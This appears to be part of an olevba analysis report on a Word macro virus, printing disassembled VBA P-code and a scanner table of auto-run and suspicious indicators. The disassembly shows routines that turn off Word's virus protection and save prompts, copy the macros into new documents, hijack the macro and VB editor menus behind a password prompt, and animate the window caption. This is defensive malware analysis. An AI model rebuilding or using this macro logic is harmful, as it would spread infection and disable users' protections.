' 	FuncDefn (Sub AutoExit())
' Line #220:
' 	ArgsCall AutoOpen 0x0000 
' Line #221:
' 	ArgsCall AnimateCaption 0x0000 
' Line #222:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #223:
' 	EndSub 
' Line #224:
' Line #225:
' 	FuncDefn (Sub fileNewDefault())
' Line #226:
' 	ArgsCall AnimateCaption 0x0000 
' Line #227:
' 	Ld WordBasic 
' 	ArgsMemCall fileNewDefault 0x0000 
' Line #228:
' 	ArgsCall Copy2Document 0x0000 
' Line #229:
' 	EndSub 
' Line #230:
' Line #231:
' 	FuncDefn (Sub FileNew())
' Line #232:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #233:
' 	ArgsCall AnimateCaption 0x0000 
' Line #234:
' 	ArgsCall Copy2Document 0x0000 
' Line #235:
' 	EndIfBlock 
' Line #236:
' 	EndSub 
' Line #237:
' Line #238:
' 	FuncDefn (Sub Stealth())
' Line #239:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #240:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #241:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #242:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #243:
' 	EndWith 
' Line #244:
' 	EndSub 
' Line #245:
' Line #246:
' 	FuncDefn (Sub NoStealth())
' Line #247:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #248:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #249:
' 	LitVarSpecial (True)
' 	MemStWith SavePropertiesPrompt 
' Line #250:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #251:
' 	EndWith 
' Line #252:
' 	EndSub 
' Line #253:
' Line #254:
' 	FuncDefn (Sub ToolsOptions())
' Line #255:
' 	ArgsCall InitDialog 0x0000 
' Line #256:
' 	ArgsCall NoStealth 0x0000 
' Line #257:
' 	OnError (Resume Next) 
' Line #258:
' 	Ld ToolsOptionsDlg 
' 	ArgsMemCall Display 0x0000 
' Line #259:
' 	ArgsCall AnimateCaption 0x0000 
' Line #260:
' 	ArgsCall Stealth 0x0000 
' Line #261:
' 	EndSub 
' Line #262:
' Line #263:
' Line #264:
' 	FuncDefn (Sub NoAccess())
' Line #265:
' 	Ld msg 
' 	Ld vbExclamation 
' 	Ld abadacc 
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #266:
' 	ArgsCall AnimateCaption 0x0000 
' Line #267:
' 	EndSub 
' Line #268:
' Line #269:
' 	FuncDefn (Function passDialog() As Boolean)
' Line #270:
' 	Dim 
' 	VarDefn cruel (As String)
' Line #271:
' 	LitVarSpecial (False)
' 	St passDialog 
' Line #272:
' 	Ld ccc 
' 	Ld code 
' 	LitDI2 0x0009 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St cruel 
' Line #273:
' 	Ld pass 
' 	Ld badboy 
' 	ArgsLd InputBox 0x0002 
' 	ArgsLd LCase 0x0001 
' 	Ld cruel 
' 	Eq 
' 	IfBlock 
' Line #274:
' 	LitVarSpecial (True)
' 	St passDialog 
' Line #275:
' 	ElseBlock 
' Line #276:
' 	ArgsCall NoAccess 0x0000 
' Line #277:
' 	EndIfBlock 
' Line #278:
' 	EndFunc 
' Line #279:
' Line #280:
' Line #281:
' 	FuncDefn (Sub ToolsMacro())
' Line #282:
' 	ArgsCall InitDialog 0x0000 
' Line #283:
' 	Ld ToolsMacrosDlg 
' 	ArgsMemCall Display 0x0000 
' Line #284:
' 	ArgsCall AnimateCaption 0x0000 
' Line #285:
' 	EndSub 
' Line #286:
' Line #287:
' Line #288:
' 	FuncDefn (Sub FileTemplates())
' Line #289:
' 	ArgsCall InitDialog 0x0000 
' Line #290:
' 	Ld ToolsTemplatesDlg 
' 	ArgsMemCall Display 0x0000 
' Line #291:
' 	QuoteRem 0x0000 0x0029 "    CustomizationContext = NormalTemplate"
' Line #292:
' 	ArgsCall AnimateCaption 0x0000 
' Line #293:
' 	EndSub 
' Line #294:
' Line #295:
' 	FuncDefn (Sub viewvbcode())
' Line #296:
' 	Ld passDialog 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #297:
' 	EndSub 
' Line #298:
' Line #299:
' 	FuncDefn (Sub viewcode())
' Line #300:
' 	ArgsCall viewvbcode 0x0000 
' Line #301:
' 	EndSub 
' Line #302:
' Line #303:
' 	FuncDefn (Sub Organizer())
' Line #304:
' 	ArgsCall InitDialog 0x0000 
' Line #305:
' 	Ld OrganizerDlg 
' 	ArgsMemCall Display 0x0000 
' Line #306:
' 	ArgsCall AnimateCaption 0x0000 
' Line #307:
' 	EndSub 
' Line #308:
' Line #309:
' 	FuncDefn (Sub FormatStyle())
' Line #310:
' 	ArgsCall InitDialog 0x0000 
' Line #311:
' 	StartWithExpr 
' 	Ld FormatStyleDlg 
' 	With 
' Line #312:
' 	ArgsMemCallWith Display 0x0000 
' Line #313:
' 	ArgsMemCallWith Execute 0x0000 
' Line #314:
' 	EndWith 
' Line #315:
' 	ArgsCall AnimateCaption 0x0000 
' Line #316:
' 	EndSub 
' Line #317:
' Line #318:
' Line #319:
' 	FuncDefn (Sub ModifyAttr(fileName As String))
' Line #320:
' 	OnError (Resume Next) 
' Line #321:
' 	Ld fileName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld fileName 
' 	Ld vbArchive 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #322:
' 	EndSub 
' Line #323:
' Line #324:
' 	FuncDefn (Sub AnimateCaption())
' Line #325:
' 	OnError (Resume Next) 
' Line #326:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' 	EndIf 
' Line #327:
' 	Ld Animated 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #328:
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	St anIntv 
' Line #329:
' 	LitDI2 0x0000 
' 	St anPos 
' Line #330:
' 	Ld OFC 
' 	St anCap 
' Line #331:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #332:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #333:
' 	EndSub 
' Line #334:
' Line #335:
' Line #336:
' 	FuncDefn (Sub ScrollCaption())
' Line #337:
' 	Ld Animated 
' 	IfBlock 
' Line #338:
' 	Ld anCap 
' 	Ld anPos 
' 	ArgsLd Right$ 0x0002 
' 	Ld Application 
' 	MemSt Caption 
' Line #339:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld anIntv 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #340:
' 	Ld anPos 
' 	LitDI2 0x0001 
' 	Add 
' 	St anPos 
' Line #341:
' 	EndIfBlock 
' Line #342:
' Line #343:
' 	Ld anPos 
' 	Ld anCap 
' 	FnLen 
' 	Gt 
' 	IfBlock 
' Line #344:
' 	OnError (Resume Next) 
' Line #345:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #346:
' Line #347:
' 	LitDI2 0x0000 
' 	St anPos 
' Line #348:
' 	Ld anCap 
' 	Ld OFC 
' 	Eq 
' 	IfBlock 
' Line #349:
' 	Ld Peace 
' 	St anCap 
' Line #350:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #351:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #352:
' 	Ld anCap 
' 	Ld Peace 
' 	Eq 
' 	ElseIfBlock 
' Line #353:
' 	Ld mw 
' 	St anCap 
' Line #354:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #355:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #356:
' 	Ld anCap 
' 	Ld mw 
' 	Eq 
' 	ElseIfBlock 
' Line #357:
' 	Ld OFC 
' 	St anCap 
' Line #358:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x04B0 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #359:
' 	LitVarSpecial (False)
' 	St Animated 
' Line #360:
' 	EndIfBlock 
' Line #361:
' 	EndIfBlock 
' Line #362:
' 	EndSub 
' Line #363:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

